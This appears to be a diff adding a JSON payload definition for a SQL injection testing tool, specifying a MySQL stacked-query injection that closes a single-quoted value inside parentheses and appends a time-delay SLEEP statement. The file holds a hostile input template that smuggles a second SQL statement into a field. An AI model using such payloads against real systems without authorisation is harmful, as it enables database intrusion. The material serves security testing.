@@ -1,0 +1,12 @@
+{
+ "dbms": "mysql",
+ "technique": "stacked",
+ "boundary": {
+  "prefix": "')",
+  "suffix": "-- -",
+  "type": "paren-single",
+  "desc": "single-quoted inside parenthesis"
+ },
+ "vector": "{B}; SELECT SLEEP({SLEEP})-- -",
+ "comment": "mysql stacked via single-quoted inside parenthesis"
+}
